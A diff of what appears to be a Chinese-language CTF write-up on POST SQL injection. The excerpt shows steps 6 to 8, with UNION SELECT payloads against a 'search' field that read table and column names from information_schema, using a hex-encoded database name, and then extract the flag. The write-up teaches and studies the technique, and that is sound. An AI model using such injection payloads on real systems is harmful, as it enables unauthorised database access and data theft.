@@ -43,6 +43,7 @@ post注入的两个条件：1.用户可以控制传参，2.用户输入的语句
 > 6.接着获取表名，构造--- search= ' Union Select 1,group concat(table name),3 from information schema.tables where table schema= 0x6E657773 # ---，得到表名为f1agfl4gher3。
 
 > 注意：这里需要把数据库名称“news”做了一个16进制Hex编码，编码之后为---0x6E657773 ---。
+
 >7.同理获取列名：--- search= ' Union Select 1,group concat(column name),3 from information schema.columns where table name=0x66316167666C346768657233)# --- ，得到列名为h3r31sfl4g。
 
 > 8.最后获取数据，--- search= ' Union Select 1,h3r31sfl4g,3 from f1agfl4gher3 # ---，得到flag！
